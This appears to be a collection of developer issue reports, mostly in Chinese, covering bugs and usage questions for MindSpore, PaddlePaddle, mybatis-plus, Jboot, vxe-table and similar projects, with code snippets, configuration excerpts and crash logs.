data_me_error:[-3.1639926-3.0305712j] E loss:[4.730191e-05]"
Jboot不支持扫描包中包,"比如 // addClassesFromJar(nestedJarPath); } } } } catch (IOException e1) { } finally { if (jarFile != null) { try { jarFile.close(); } catch (IOException e) { } } } }   <code>: //扫描某boot的包中包 private static void addClassesFromJar(String jarPath) { JarFile jarFile = null; try { jarFile = new JarFile(jarPath); Enumeration&lt;JarEntry&gt; entries = jarFile.entries(); while (entries.hasMoreElements()) { JarEntry jarEntry = entries.nextElement(); if (jarEntry.isDirectory()) { String entryName = jarEntry.getName(); if (isPrintScannerInfoEnable()) { System.out.println(""Jboot Scan entryName: "" + entryName); } if (entryName.startsWith(""BOOT-INF/classes/"")) { if (entryName.endsWith("".class"")) { String className = entryName.replace(""/"", ""."").substring(0, entryName.length() - 6); addClass(classForName(className)); } } } else { String entryName = jarEntry.getName(); if (entryName.endsWith("".class"")) { String className = entryName.replace(""/"", ""."").substring(0, entryName.length() - 6); addClass(classForName(className)); } else if (entryName.startsWith(""BOOT-INF/lib/"") &amp;&amp; entryName.endsWith("".jar"")) { if (!isIncludeJar(entryName)) { continue; } if (isPrintScannerInfoEnable()) { System.out.println(""Jboot Scan Jar: "" + entryName); } JarInputStream jarIS = new JarInputStream(jarFile .getInputStream(jarEntry)); JarEntry innerEntry = jarIS.getNextJarEntry(); while (innerEntry != null) { if (!innerEntry.isDirectory()) { String nestedEntryName = innerEntry.getName(); if (nestedEntryName.endsWith("".class"")) { String className = nestedEntryName.replace(""/"", ""."").substring(0, nestedEntryName.length() - 6); addClass(classForName(className)); } } innerEntry = jarIS.getNextJarEntry(); } if (jarIS != null) { jarIS.close(); }"
【众智】【计算-用户接口】Addmv,"Addmv functional接口 计算: out=<em>β</em> input + <em>α</em> (mat @ vec) functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 支持数据类型 PyTorch1.8.1接口： torch.addmv https://pytorch.org/docs/1.8.1/generated/torch.addmv.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: def addmv(input: tensor, mat: tensor, vec: tensor, *, beta: number=1, alpha: number=1) -&gt; tensor: return y CPU：float16、float32、float64 GPU：float16、float32、float64 Ascend：float16、float32、int32、int64"
数据库关键字不再自动转义了,"mybatis-plus版本：3.0-RELEASE 数据库：mysql5.7 desc是关键字，打印执行sql是 <em>SELECT id,name,desc FROM admin_role</em> 没有加转义符号`，请问是哪里要加配置吗？   <code>: public class AdminRole extends BaseIdEntity implements Serializable { /** 角色名称 **/ private String name; /** 描述 **/ private String desc; public String getName() { return name; } public void setName(String name) { this.name = name; } public String getDesc() { return desc; } public void setDesc(String desc) { this.desc = desc; } }"
[MSLite][r1.6.1][micro]arm64推理代码工程开启并行推理模式后，编译出的benchmark执行崩溃报错,"开启supportParallel多线程并行推理后，生成端侧arm64的benchmark程序执行崩溃，报错信息为memset: prevented 36864-byte write into 256-byte buffer。 不打开supportParallel模式时可以正常执行。 / 硬件环境: /device CPU : -- MindSpore version : 1.6.1 -- Python version : Python 3.9.7 -- OS platform and distribution : Linux Ubuntu 18.04 -- GCC/Compiler version : gcc 7.5.0, cmake 3.23.1, android-ndk-r21e (/): /mode graph mindspore 使用codegen将ms lite模型转换为arm64架构的支持并行推理的代码工程 使用命令如下， cmake编译推理代码工程，生成benchmark可执行程序 使用命令如下， <ol start=""3""> 将benchmark可执行程序、网络权重文件net.bin、输入文件input.bin通过adb push到手机(P40 Pro)后，赋予执行权限，执行benchmark程序，通过参数指定2个线程进行并行推理 正常执行，打印循环次数、执行时间和网络推理输出的Tensor结果。 benchmark执行时打印的log android logcat   <code>: ~/buildToolz/mindspore-lite-1.6.1-linux-x64/tools/codegen/codegen --modelPath=./MyVectLane0517.ms --codePath=. --target=ARM64 --supportParallel=true ${MY_CMAKE_ROOT}/cmake -DCMAKE_BUILD_TYPE=Release \ -DCMAKE_TOOLCHAIN_FILE=""${MY_NDK_ROOT}/build/cmake/android.toolchain.cmake"" \ -DANDROID_ABI=""arm64-v8a"" \ -DANDROID_TOOLCHAIN_NAME=""aarch64-linux-android-clang"" \ -DANDROID_NATIVE_API_LEVEL=""19"" \ -DPLATFORM_ARM64=ON \ -DPKG_PATH=/home/xxx/buildToolz/mindspore-lite-1.6.1-android-aarch64 .. make -j${N_JOBS} =======run benchmark====== context: ThreadNum: 2, BindMode: 0 FORTIFY: memset: prevented 36864-byte write into 256-byte buffer Aborted 05-18 09:58:45.773 28935 28939 E MS_LITE : SetAffinity|44: ""bind thread 28939 to cpu failed. ERROR 22"" 05-18 09:58:45.773 28935 28938 E MS_LITE : SetAffinity|44: ""bind thread 28938 to cpu failed. ERROR 22"" 05-18 09:58:45.792 28942 28942 F DEBUG : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** 05-18 09:58:45.793 28942 28942 F DEBUG : Build fingerprint: 'HUAWEI/ELS-AN00/HWELS:10/HUAWEIELS-AN00/102.0.0.236C00:user/release-keys' 05-18 09:58:45.793 28942 28942 F DEBUG : Revision: '0' 05-18 09:58:45.793 28942 28942 F DEBUG : ABI: 'arm64' 05-18 09:58:45.795 28942 28942 F DEBUG : SYSVMTYPE: Maple 05-18 09:58:45.795 28942 28942 F DEBUG : APPVMTYPE: Art 05-18 09:58:45.795 28942 28942 F DEBUG : Timestamp: 2022-05-18 09:58:45+0800 05-18 09:58:45.795 28942 28942 F DEBUG : pid: 28935, tid: 28935, name: benchmark &gt;&gt;&gt; ./benchmark &lt;&lt;&lt; 05-18 09:58:45.795 28942 28942 F DEBUG : uid: 2000 05-18 09:58:45.795 28942 28942 F DEBUG : signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr -------- 05-18 09:58:45.795 28942 28942 F DEBUG : Abort message: 'FORTIFY: memset: prevented 36864-byte write into 256-byte buffer' 05-18 09:58:45.795 28942 28942 F DEBUG : x0 0000000000000000 x1 0000000000007107 x2 0000000000000006 x3 0000007fed259690 05-18 09:58:45.795 28942 28942 F DEBUG : x4 0000000000000000 x5 0000000000000000 x6 0000000000000000 x7 0000000000000008 05-18 09:58:45.795 28942 28942 F DEBUG : x8 00000000000000f0 x9 8819fef5f23b6932 x10 0000000000000001 x11 0000000000000000 05-18 09:58:45.795 28942 28942 F DEBUG : x12 fffffff0ffffffdf x13 00000000628452d5 x14 000b8ffd954dde00 x15 00000c4030954d4e 05-18 09:58:45.795 28942 28942 F DEBUG : x16 000000765cb30a08 x17 000000765cb107c0 x18 000000765d53c000 x19 0000000000007107 05-18 09:58:45.795 28942 28942 F DEBUG : x20 0000000000007107 x21 00000000ffffffff x22 000000000040f960 x23 00000076589e9660 05-18 09:58:45.795 28942 28942 F DEBUG : x24 000000765867c400 x25 000000765c451000 x26 00000076587b8e50 x27 00000076586b79c8 05-18 09:58:45.795 28942 28942 F DEBUG : x28 000000765868e400 x29 0000007fed259730 05-18 09:58:45.795 28942 28942 F DEBUG : sp 0000007fed259670 lr 000000765cac5640 pc 000000765cac566c 05-18 09:58:45.796 28942 28942 F DEBUG : 05-18 09:58:45.796 28942 28942 F DEBUG : backtrace: 05-18 09:58:45.796 28942 28942 F DEBUG : NOTE: Function names and BuildId information is missing for some frames due 05-18 09:58:45.796 28942 28942 F DEBUG : NOTE: to unreadable libraries. For unwinds of apps, only shared libraries 05-18 09:58:45.796 28942 28942 F DEBUG : NOTE: found under the lib/ directory are readable. 05-18 09:58:45.796 28942 28942 F DEBUG : #00 pc 000000000007066c /apex/com.android.runtime/lib64/bionic/libc.so (abort+160) (BuildId: b91c775ccc9b0556e91bc575a2511cd0) 05-18 09:58:45.796 28942 28942 F DEBUG : #01 pc 0000000000095bc8 /apex/com.android.runtime/lib64/bionic/libc.so (__fortify_fatal(char const*, ...)+116) (BuildId: b91c775ccc9b0556e91bc575a2511cd0) 05-18 09:58:45.796 28942 28942 F DEBUG : #02 pc 0000000000095bf4 /apex/com.android.runtime/lib64/bionic/libc.so (__check_buffer_access(char const*, char const*, unsigned long, unsigned long)+40) (BuildId: b91c775ccc9b0556e91bc575a2511cd0) 05-18 09:58:45.796 28942 28942 F DEBUG : #03 pc 0000000000095e10 /apex/com.android.runtime/lib64/bionic/libc.so (__memset_chk_fail+68) (BuildId: b91c775ccc9b0556e91bc575a2511cd0) 05-18 09:58:45.796 28942 28942 F DEBUG : #04 pc 000000000006bcbc /apex/com.android.runtime/lib64/bionic/libc.so (__memset_chk+12) (BuildId: b91c775ccc9b0556e91bc575a2511cd0) 05-18 09:58:45.796 28942 28942 F DEBUG : #05 pc 0000000000023584 /data/local/tmp/20220517_parallel/benchmark (Init) 05-18 09:58:45.796 28942 28942 F DEBUG : #06 pc 000000000001ec08 /data/local/tmp/20220517_parallel/benchmark (mindspore::lite::LiteSession::CompileGraph(mindspore::lite::Model*)) 05-18 09:58:45.796 28942 28942 F DEBUG : #07 pc 000000000001fba4 /data/local/tmp/20220517_parallel/benchmark (mindspore::session::LiteSession::CreateSession(char const*, unsigned long, mindspore::lite::Context const*)) 05-18 09:58:45.796 28942 28942 F DEBUG : #08 pc 0000000000019744 /data/local/tmp/20220517_parallel/benchmark (main)"
Single release for PaddlePaddle CPU Image ,Please give me some ....   <code>: ack
"[CT][MS][SparseToDenseV2] 算子再ascend上出现RuntimeError: Cast failed, original value: None, type: None","算子在ascend上 运行 test_p_sparsetodensev2_values_default_value_int32用例出现 正向问题 报错提示 RuntimeError: Cast failed, original value: None, type: None 需要注意的是 存在一部分的用例是必现，一部分是偶现的情况 def test_p_sparsetodensev2_values_default_value_int32(): index_arr, shape_arr, value_arr = construct_random_number_2(110) indices = Tensor(np.array(index_arr).astype(np.int64)) output_shape = Tensor(np.array(shape_arr).astype(np.int64)) values = Tensor(np.array(value_arr).astype(np.int32)) default_value = Tensor(0, dtype=mstype.int32) fact = SparseToDenseV2Mock(inputs=[indices, output_shape, values, default_value]) test_p_sparsetodensev2_indices_1d_120w   <code>: fact.forward_cmp()"
iBase4J-Common中mybatis.xml中如何配置多个包路径,"目前在研究iBase4J，里面用到了mybatis-plus，在iBase4J-Common的mybatis.xml文件中，typeAliasesPackage 和 basePackage 都可以实现多个包路径的配置，通过通配符和逗号。 我的项目中的代码是在iBase4J-Biz-XXX中，父级包是com.well，实体包是com.well.xxx.model，代理包是com.well.xxx.mapper， 而iBase4J项目中的代码是在iBase4J-SYS-XXX中，父级包为org.ibase4j，实体包是org.ibase4j.model，代理包是org.ibase4j.mapper。使用如下配置 debug一下代码， MapperScannerConfigurer 是能够扫描到 org.ibase4j.mapper 和 com.bdjsi.xxx.mapper，但是 MybatisSqlSessionFactoryBean 却不能扫描到 org.ibase4j.model 和 com.bdjsi.xxx.model ，这是因为在代码中 if 条件导致的 PackageHelper.convertTypeAliasesPackage(typeAliasesPackage); 这个方法没有对逗号进行分割。 如果我现在还是想配置 org.ibase4j.model 和 com.bdjsi.xxx.model ，那么 MapperScannerConfigurer 中的 typeAliasesPackage 应该如何配置？   <code>: &lt;bean id=""sqlSessionFactory"" class=""com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean""&gt; &lt;property name=""dataSource"" ref=""dataSource"" /&gt; &lt;property name=""configLocation"" value=""classpath:mybatis-config.xml"" /&gt; &lt;!-- 自动扫描mapping.xml文件 --&gt; &lt;property name=""mapperLocations"" value=""classpath*:**/mapper/xml/*.xml"" /&gt; &lt;property name=""typeAliasesPackage"" value=""org.ibase4j.model,com.bdjsi.**.model"" /&gt; &lt;/bean&gt; &lt;bean class=""org.mybatis.spring.mapper.MapperScannerConfigurer""&gt; &lt;property name=""basePackage"" value=""org.ibase4j.mapper,com.bdjsi.**.mapper"" /&gt; &lt;property name=""sqlSessionFactoryBeanName"" value=""sqlSessionFactory"" /&gt; &lt;/bean&gt; if (typeAliasesPackage.contains(""*"")) { typeAliasPackageArray = PackageHelper.convertTypeAliasesPackage(typeAliasesPackage); } else { typeAliasPackageArray = tokenizeToStringArray(this.typeAliasesPackage, ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS); }"
input datetime等使用vxe-form获取不到值,"嵌套了vxe-model vxe-form 不知是否这块是影响源 ？ ？ OS: ？ Browser: ？chrome vue: ？2.6.12 vxe-table: ？3.0.17   <code>: { field: ""contractStartDate"", title: ""履约开始日期"", span: 12, folding: false, itemRender: { name: ""$input"", props: { placeholder: ""请输入履约开始日期"", type: ""datetime"" } } },"
u-no-network 网络监听,"现在网络状态变化后只是不显示组件 但是没有调用retry（）的事件 可以加一个watch监听变化   <code>: isConnected(n, o) { if (n !== o) { this.retry() } }"
关于integer_value_sequence的用法,"integer_value_sequence会把同一个batch的值concat到一起吗？ 如下代码，我期望emb_idx是[1,2,3] 实际print出来是 [1,2,3,1,2,3,1,2,3]，看起来是把3个batch的concat到一起了。   <code>: def train(): def reader_fn(): for i in range(0, 10000): yield [[1,2,3]] feeding = {""emb_idx"":0} paddle.init(use_gpu=False, trainer_count=1) optimizer = paddle.optimizer.Adam(learning_rate=1e-4) data = paddle.layer.data(name=""emb_idx"", type=paddle.data_type.integer_value_sequence(10)) parameters = paddle.parameters.create(data) trainer = paddle.trainer.SGD(data, parameters, optimizer) def event_handler(event): if isinstance(event, paddle.event.EndIteration): t=event.gm.getLayerOutputs('emb_idx')['emb_idx']['id'] print t trainer.train( reader=paddle.batch( reader_fn , batch_size=3), num_passes=1, feeding=feeding, event_handler=event_handler)"
ModelCheckpoint directory changed ,": /device ascend : modelarts excute the testcase PermissionError: [Errno 13] Permission denied: '/3:' save checkpoint file to s3://bucket-abc/dir1/   <code>: ckpt_path = ""s3://bucket-abc/dir1/"" ckpoint_cb = ModelCheckpoint(directory=ckpt_path, config=config_ck) [ERROR] ME(176:281473318780944,MainProcess):2020-05-28-02:06:25.885.852 [mindspore/train/_utils.py:93] No write permission on the directory('/3://bucket-abc/dir1/'), error = PermissionError(13, 'Permission denied') Traceback (most recent call last): File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/_utils.py"", line 90, in _make_directory os.makedirs(path, exist_ok=True) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/moxing/framework/file/file_io_utils.py"", line 211, in mox_makedirs return _origin_os_makedirs(url, *args, **kwargs)"
2.0.0rc如何提取张量中的值？,"比如我想获取b中维度为0的数据，如果用就报错， 有的麻烦，如何写更加简洁呢？   <code>: b[0] paddle.gather(b, paddle.to_tensor(0)) import paddle import numpy paddle.set_device(""cpu"") a = numpy.array([1, 2, 3]) b = paddle.to_tensor(a, dtype='int64') print(paddle.gather(b, paddle.to_tensor(0))) # print(b[0])"
[鹏城实验室] nn.Unfold和torch的结果不一致，文档解释不清楚,和结果不一致，并且文档中没有给出具体的计算方式，只给出了输出大小的计算，差异对比中也无法看出计算差别。 / 硬件环境: /device ascend/GPU/ : -- MindSpore version : 1.7.0 -- Python version : 3.7.5 -- OS platform and distribution : euler (/): /mode pynative /mode graph   <code>: torch.nn.Unfold mindspore.nn.Unfold
TableNameParser 动态表名bug,"当前使用版本 3.2.0 TableNameParser 类解析表名出错 sql：   <code>: CREATE TABLE `c_auth_resource` ( `id` bigint(20) NOT NULL COMMENT 'ID', `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '资源编码\n规则：\n链接：\n数据列：\n按钮：', `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '接口名称', `menu_id` bigint(20) NULL DEFAULT NULL COMMENT '菜单ID\n#c_auth_menu', `describe_` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '接口描述', `create_user` bigint(20) NULL DEFAULT NULL COMMENT '创建人id', `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间', `update_user` bigint(20) NULL DEFAULT NULL COMMENT '更新人id', `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间', PRIMARY KEY (`id`) USING BTREE, UNIQUE INDEX `UN_CODE`(`code`) USING BTREE COMMENT '编码唯一' ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '资源' ROW_FORMAT = Dynamic; insert into c_auth_resource ( id, create_user, create_time, update_user, update_time, code, name, menu_id, describe_) values (#{id,jdbcType=BIGINT}, #{createUser,jdbcType=BIGINT}, #{createTime,jdbcType=TIMESTAMP},#{updateUser,jdbcType=BIGINT}, #{updateTime,jdbcType=TIMESTAMP}, #{code,jdbcType=VARCHAR}, #{name,jdbcType=VARCHAR}, #{menuId,jdbcType=BIGINT}, #{tags,jdbcType=VARCHAR}, #{describe,jdbcType=VARCHAR} ) ON DUPLICATE KEY UPDATE name = #{name,jdbcType=VARCHAR}, describe_ = #{describe,jdbcType=VARCHAR}, update_user = #{updateUser,jdbcType=BIGINT}, update_time = #{updateTime,jdbcType=TIMESTAMP}"
The unit testing of test_lstm_op and test_gru_op failed due to the Eigen in debug mode.,"In the debug mode, the unit testing of test_lstm_op and test_gru_op failed, error: The Eigen sum function failed with double type on GPU.   <code>: python: /home/dangqingqing/.third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/Tensor/TensorReductionCuda.h:704: static bool Eigen::internal::OuterReducer&lt;Self, Op, Eigen::GpuDevice&gt;::run(const Self&amp;, Op&amp;, const Device&amp;, OutputType*, typename Self::Index, typename Self::Index) [with Device = Eigen::GpuDevice; OutputType = double; Self = Eigen::TensorEvaluator&lt;const Eigen::TensorReductionOp&lt;Eigen::internal::SumReducer&lt;double&gt;, const Eigen::array&lt;int, 1ul&gt;, const Eigen::TensorMap&lt;Eigen::Tensor&lt;const double, 2, 1, long int&gt;, 0, Eigen::MakePointer&gt;, Eigen::MakePointer&gt;, Eigen::GpuDevice&gt;; Op = Eigen::internal::SumReducer&lt;double&gt;; typename Self::Index = long int]: Assertion `false &amp;&amp; ""Should only be called to reduce doubles or floats on a gpu device""' failed. Thread 1 ""python"" received signal SIGABRT, Aborted."
Sql模板动态传入where语句报错,"Furion 版本号 2.20.6 .NET SDK 版本号 [√ ] .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 发生了什么？ 不报错，可正常使用   <code>: Microsoft.Data.SqlClient.SqlException:““@customerFilters”附近有语法错误。” select [CustomerId], [Name] into #customer_tb from [dbo].[score_customer] where 1 = 1 @customerFilters Microsoft.Data.SqlClient.SqlException HResult=0x80131904 Message=“@customerFilters”附近有语法错误。 Source=Core Microsoft SqlClient Data Provider StackTrace: at Microsoft.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) at Microsoft.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) at Microsoft.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) at Microsoft.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean&amp; dataReady) at Microsoft.Data.SqlClient.SqlDataReader.TryConsumeMetaData() at Microsoft.Data.SqlClient.SqlDataReader.get_MetaData() at Microsoft.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString, Boolean isInternal, Boolean forDescribeParameterEncryption, Boolean shouldCacheForAlwaysEncrypted) at Microsoft.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean isAsync, Int32 timeout, Task&amp; task, Boolean asyncWrite, Boolean inRetry, SqlDataReader ds, Boolean describeParameterEncryptionRequest) at Microsoft.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, TaskCompletionSource`1 completion, Int32 timeout, Task&amp; task, Boolean&amp; usedCache, Boolean asyncWrite, Boolean inRetry, String method) at Microsoft.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) at Microsoft.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior) at Microsoft.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) at System.Data.Common.DbCommand.ExecuteReader(CommandBehavior behavior) at Furion.DatabaseAccessor.SqlAdoNetExtensions.ExecuteReader(DatabaseFacade databaseFacade, String sql, Object model, CommandType commandType, CommandBehavior behavior) at Furion.DatabaseAccessor.PrivateSqlRepository.SqlQuery[T](String sql, Object model) at BES.NET.Application.Service.Report.ReportService.reoprt_01(Report_paramters_01 report_Paramters) in D:\WorkSpace\ProjectTeam\bes\BES.NET.Application\Service\Report\ReportService.cs:line 51 at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.&lt;Execute&gt;d__0.MoveNext() BES.NET.Application.Service.Report.ReportService.reoprt_01(BES.NET.Application.Service.Report_paramters_01) (位于 ReportService.cs 中) [外部代码]"
初始化数据库js_sys_user_data_scope表报错,"用initCoreData()初始化数据库的时候报错 js_sys_user_data_scope 里面user_code非空又没默认值，为啥执行sql的时候不插这个值？还是我哪里配错了   <code>: ### Error updating database. Cause: java.sql.SQLException: Field 'user_code' doesn't have a default value ### The error may involve com.jeesite.modules.sys.dao.UserDataScopeDao.insert-Inline ### The error occurred while setting parameters ### SQL: INSERT INTO js_sys_user_data_scope (`ctrl_type`, `ctrl_data`, `ctrl_permi`) VALUES (?, ?, ?) ### Cause: java.sql.SQLException: Field 'user_code' doesn't have a default value ; SQL []; Field 'user_code' doesn't have a default value; nested exception is java.sql.SQLException: Field 'user_code' doesn't have a default value"
Contribute and logging,"This PR moves the new content to be merged in https://github.com/PaddlePaddle/Paddle/pull/5121 into , updates and merges content from into , and removes .   <code>: /CONTRIBUTE.md doc/.../contribute_to_paddle_en.md /CONTRIBUTE.md doc/.../contribute_to_paddle_cn.md"
spring.profiles.active  属性变更,环境信息 pigx版本: v4.4 是否修改包名: 否 提供详细 属性已经过期需要变更为   <code>: spring: config: activate: on-profile:
RuoYiSystemApplication 启动报错dynamic-datasource can not find primary datasource,nacos 配置： 其他没改。   <code>: db.url.0=jdbc:mysql://127.0.0.1:3306/ry-config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC db.user.0=root db.password.0=123456
[ST][MS][NET][DCN][ascend 8p]FPS[2827296] can not reach 2852000,"DCN网络在910环境8p训练，性能2827296/fps达不到2852000 / 硬件环境: /device ascend : -- MindSpore version :r1.8 B010 commit_id:42306df4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C82/20220518 (/): /mode graph test_ms_modelinternal_deep_cross_train_infer_8p.py cd solution_test/remaining/test_scripts/mindspore/net/deep_cross/network python -m nose -s --nologcapture test_ms_modelinternal_deep_cross_train_infer_8p.py 网络训练成功，性能能达到2852000 走给曹杰文   <code>: epoch time: 107142.789 ms, per step time: 207.641 ms epoch time: 14501.775 ms, per step time: 28.104 ms epoch time: 14895.921 ms, per step time: 28.868 ms epoch time: 14803.374 ms, per step time: 28.689 ms epoch time: 14800.007 ms, per step time: 28.682 ms epoch time: 14551.737 ms, per step time: 28.201 ms epoch time: 14511.293 ms, per step time: 28.123 ms epoch time: 14537.309 ms, per step time: 28.173 ms epoch time: 14521.243 ms, per step time: 28.142 ms epoch time: 14766.927 ms, per step time: 28.618 ms epoch time: 14538.892 ms, per step time: 28.176 ms epoch time: 14513.266 ms, per step time: 28.126 ms epoch time: 14520.558 ms, per step time: 28.141 ms epoch time: 14500.959 ms, per step time: 28.103 ms epoch time: 14511.646 ms, per step time: 28.123 ms epoch time: 14532.917 ms, per step time: 28.165 ms epoch time: 14773.722 ms, per step time: 28.631 ms epoch time: 14530.229 ms, per step time: 28.159 ms epoch time: 14521.069 ms, per step time: 28.142 ms epoch time: 14577.058 ms, per step time: 28.250 ms"
安装数据库php artisan chemex:install ,"Migrating: 2021_03_24_213912_version_3_0_0 Illuminate\Database\QueryException SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'admin_users' already exists (SQL: create table ( bigint unsigned not null auto_increment primary key, varchar(120) not null, varchar(80) not null, varchar(191) not null, varchar(191) null, varchar(100) null, int not null default '0', char(191) not null default '无', varchar(191) null, varchar(191) null, varchar(191) null, int not null default '0', varchar(191) null, timestamp null, timestamp null, timestamp null) default character set utf8mb4 collate 'utf8mb4_unicode_ci')   <code>: admin_users id username password name avatar remember_token department_id gender title mobile email ad_tag extended_fields deleted_at created_at updated_at"
Make parallel tests bind to different GPU.,"Fix https://github.com/PaddlePaddle/Paddle/issues/7992 Use CUDA_VISIBLE_DEVICES to change the visible GPU order for each processor before command. Use to run tests in parallel, please to refer https://cmake.org/cmake/help/v3.0/manual/ctest.1.html?highlight=ctest to learn more about option -I [Start,End,Stride,test#,test#|Test file], --tests-information Run a specific number of tests by number. This option causes ctest to run tests starting at number Start, ending at number End, and incrementing by Stride. Any additional numbers after Stride are considered individual test numbers. Start, End,or stride can be empty. Optionally a file can be given that contains the same syntax as the command line. But some output log is disorderly:   <code>: ctest ctest -I -I Start 165: test_split_and_merge_lod_tensor_op 52/75 Test #206: test_is_empty_op .................. Passed 9.42 sec Start 210: test_tensor 53/75 Test #211: 42/76 Test #165: test_crop_op ................................test_split_and_merge_lod_tensor_op ....... Passed Passed 10.32 sec 8.57 sec Start 215: test_cond_op Start 169: test_lookup_table_op 54/75 Test #215: test_cond_op ................................ Passed 3.12 sec"
希望数据类型DataType支持string类型,"hi, 现在的DataType只支持这四种格式： 这样就限制了dataprovider settings.input_types类型。 在做预测的时候，希望连同数据结果，同时输出预测数据的部分信息，比如id， 那么如果这个id是整形的，目前可以通过：integer_value(1)输出（因为预测的batch_size=1因此不用考虑长度） 但如果id超出了整形范围，或者是hex-id，那么现在的paddle就没办法输出这个了。 希望有一天paddle可以支持输出预测文件的部分文件信息。这个对我们还挺重要的。 如： 这样让settings.input_types里支持类型 谢谢。   <code>: class DataType(object): Dense = 0 SparseNonValue = 1 SparseValue = 2 Index = 3 class DataType(object): Dense = 0 SparseNonValue = 1 SparseValue = 2 Index = 3 String = 4 string_value(1)"
如何贡献组件？,"注：项目为依赖 pnpm workspace 的 monorepo 架构，需要使用 pnpm 包管理器 认领 issues 中 规划的任务 组件开发所涉及的技术栈 vue-next，vue-router，setup script，typescript <ol start=""3""> 如何在 layui - vue 中开发组件 (1). src / module 创建 componentName 目录 (2). 创建的目录下提供 index.vue 组件源码 与 index.ts 导出配置 index.ts index.vue (3). src / index.ts 聚合导出 src / index.ts <ol start=""4""> 提交 PR 代码   <code>: npm run commit"
PaddlePaddle训练中的reader读取数据时是否允许有异常？,"PaddlePaddle 1.2.0 Python 3.5 Ubuntu 16.04 问题 比如我按照以下的代码片段处理，如果try块中有异常，是否会影响训练。实际测试中并不会退出训练，但就是不知道是否会对训练有影响，比如影响模型数据读取的准确性。   <code>: def train_mapper(sample): img, label = sample path = img try: img = Image.open(img) # 统一图片大小 img = img.resize((224, 224), Image.ANTIALIAS) # 把图片转换成numpy值 img = np.array(img).astype(np.float32) # 转换成CHW img = img.transpose((2, 0, 1)) # 转换成BGR img = img[(2, 1, 0), :, :] / 255.0 except: print(path) return return img, int(label)"
A unittest framework for gradient operators,Implement in unittest. Implement class for operator. Developer can use to check gradient operator is correct or not.   <code>: get_numeric_gradient GradientChecker GradientChecker(op)
Sqlite数据库，BOLB数据类型，单条数据获取映射正常，使用page时报错 无法获取到列,"当前使用版本 3.4.3.2 我有两个BOLB字段，由于一些代码迭代原因，我现在不在采取读取数据库BOLB字段，但是由于日前自定义了 处理类。现在保留在该处理类中 方法内部加载外部数据文件给该字段赋值。现在的问题是，当我使用 时可以正确映射并追加本地数据到原BOLB字段对应的JAVA POJO属性上；   <code>: @Component @MappedJdbcTypes(JdbcType.BLOB) @Slf4j @ConfigurationProperties(prefix = ""system-global-config"") @Data @EqualsAndHashCode(callSuper = false) public class BlobHandler extends BaseTypeHandler&lt;List&lt;Float&gt;&gt; { @ApiModelProperty(value = ""系统指定根目录"") private String rootLocation; @ApiModelProperty(value = ""系统名称"") private String systemName; @Override public void setNonNullParameter(PreparedStatement ps, int i, List&lt;Float&gt; parameter, JdbcType jdbcType) throws SQLException { ps.setObject(i, parameter); } @Override public List&lt;Float&gt; getNullableResult(ResultSet rs, String columnName) throws SQLException { List&lt;Float&gt; list = new ArrayList&lt;Float&gt;(); LocalDateTime frameDateTime = LocalDateTime.parse(rs.getString(""CheckTime"").replace("" "", ""T"")); String yyyymm = frameDateTime.format(DateTimeFormatter.ofPattern(""yyyyMM"")); String day = String.format(""%02d"", frameDateTime.getDayOfMonth()); LocalTime frameTime = LocalTime.parse(rs.getString(""CheckTime""), DateTimeFormatter.ofPattern(""yyyy-MM-dd HH:mm:ss"")); File file = new File(rootLocation + ""设备数据"" + File.separator + yyyymm + File.separator + day); if (file.exists()) { String[] dailyPaths = file.list(); ArrayList&lt;LocalTime&gt; times = new ArrayList&lt;LocalTime&gt;(); for (String pathItem : dailyPaths) { times.add(LocalTime.parse(pathItem, DateTimeFormatter.ofPattern(""HHmmss""))); } times.sort((prev, next) -&gt; prev.compareTo(next)); log.debug(times.toString()); String dailyPath = """"; for (int i = 0; i &lt; dailyPaths.length - 1; i++) { if (frameTime.compareTo(times.get(0)) == -1) { log.debug(""成功为首期数据匹配到首部文件夹："" + dailyPaths[0]); 